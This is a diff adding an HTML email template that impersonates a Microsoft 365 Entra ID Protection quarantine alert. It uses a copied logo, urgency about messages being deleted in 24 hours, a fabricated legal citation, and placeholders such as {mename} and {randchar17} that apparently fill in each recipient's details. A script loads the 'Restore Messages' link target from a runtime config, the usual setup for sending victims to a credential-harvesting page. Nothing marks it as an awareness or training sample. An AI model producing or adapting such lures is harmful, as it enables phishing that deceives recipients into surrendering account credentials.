@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            background-color: #0F6CBD; /* Blue stripe */
+            padding: 20px;
+            text-align: center;
+        }
+        img {
+            max-width: 100px; /* Optional: adjust size of logo */
+            height: auto;
+            vertical-align: bottom;
+        }
+        h1 {
+            font-size: 24px;
+            margin: 0;
+            color: white;
+            padding: 20px;
+        }
+        .message {
+            padding: 20px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        .disclaimer {
+            font-size: 12px;
+            color: grey;
+            padding: 10px 20px;
+            text-align: center;
+            border-top: 1px solid #ddd;
+            margin-top: 20px;
+        }
+        .red-text {
+            color: #d80000; /* Red text style */
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header with blue stripe -->
+    <div class="header">
+        <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK0AAACtCAIAAABNzWgUAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAANmSURBVHhe7dQxq5cFFMfxlsI30vsoms2hpb33YIM5hENDa9QUdUOa0kmSRDeNsNsSaTTcKKTBzetzKQUheeD58zv/wxWcj58vvzdw4MN5bZGWhQOtcaA1DrTGgdY40BoHWjvdwclvPy/ffDp7Jze/267d7/Dvgxu/fzR7Rw/vbNfuesE/uHawvPfm7D2+9MF27H6Xf3n345tvzN6Pf36+XbuLgx4HJQ5Gj4OMgxoHPQ5KHIweBxkHNQ56HJQ4GD0OMg5qHPQ4KHEwehxkHNQ46HFQ4mD0OMg4qHHQ46DEwehxkHFQ46DHQYmD0eMg46DGQY+DEgejx0HGQY2DHgclDkaPg4yDGgc9DkocjB4HGQc1DnoclDgYPQ4yDmoc9DgocTB6HGQc1DjocVDiYPQ4yDiocdDjoMTB6HGQcVDjoMdBiYPR4yDjoMZBj4MSB6PHQcZBjYMeByUORo+DjIMaBz0OShyMHgcZBzUOehyUOBg9DjIOahz0OChxMHocZBzUOOhxUOJg9DjIOKhx0OOgxMHocZBxUOOgx0GJg9HjIOOgxkGPgxIHo8dBxkGNgx4HJQ5G72UdnNz+frnw/vB99cl27X7X75//8u7bs/frgyvbtbte8A/0isWB1jjQGgda40BrHGiNA62d7uDK0fLWD8ezd/7u8Xbtfk/vffjsp3dm778HV7drd53u4LN7j1//9tHsnb31aLt2v2eH5/6/cWb2nhx9sV27i4MeB4mD2eMg46DGQY+DxMHscZBxUOOgx0HiYPY4yDiocdDjIHEwexxkHNQ46HGQOJg9DjIOahz0OEgczB4HGQc1DnocJA5mj4OMgxoHPQ4SB7PHQcZBjYMeB4mD2eMg46DGQY+DxMHscZBxUOOgx0HiYPY4yDiocdDjIHEwexxkHNQ46HGQOJg9DjIOahz0OEgczB4HGQc1DnocJA5mj4OMgxoHPQ4SB7PHQcZBjYMeB4mD2eMg46DGQY+DxMHscZBxUOOgx0HiYPY4yDiocdDjIHEwexxkHNQ46HGQOJg9DjIOahz0OEgczB4HGQc1DnocJA5mj4OMgxoHPQ4SB7PHQcZBjYMeB4mD2XtZB7f/WS4cHs/e139sx7ae/HXw9P7F2fv34Z3t2l2nO9CrFgda40BrHGiNAy3LsjwHFC6sNExtSvQAAAAASUVORK5CYII=" alt="Microsoft Logo">    365 Entra ID Protection&copy;</h1>
+    </div>
+
+    <!-- Message section -->
+    <div class="message">
+        <h2><b>Risk-based access policies</b></h2>
+        <p>Dear {mename},<br><br>
+            • <span class="red-text"><b>8 Messages</b></span> Failed to deliver to your mailbox {date9}. Hash ID: {randchar17}<br>
+            • These messages will be deleted in 24 hours if no action has been taken to review and restore messages.<br><br>
+            
+            We have observed that emails between our Office 365 accounts are being quarantined, please reply with the affected email addresses and specify whether the quarantined messages should be released or blocked.<br><br>
+            
+            <a id="restoreBtn" href="#">Restore Messages</a><br><br>
+
+            This e-mail is covered by the Electronic Communications Act 13 M.U.S. {randomnum3} legally privileged.</p>
+    </div>
+
+    <!-- Disclaimer section -->
+    <div class="disclaimer">
+        <p>NOTICE OF CONFIDENTIALITY: The data contained within this transmission is destined for private and secretive utilization by the specified addressee. The correspondence may constitute a financial institution client interaction, and as such is safeguarded and classified. If the peruser of this correspondence is not the designated receiver or an intermediary accountable for conveying it to the designated receiver, you are hereby informed that you have acquired this dossier in mistake and that any examination, propagation, circulation, or replication of this correspondence is absolutely forbidden. Please alert the transmitter by responding to this transmission, and then eradicate it from your repository.</p>
+    </div>
+    <script>
+    fetch('/config')
+        .then(res => res.json())
+        .then(cfg => {
+        document.getElementById("restoreBtn").href = cfg.DOCUMENT_URL;
+        })
+        .catch(err => console.error("Config load failed", err));
+</script>
+</body>
+</html>
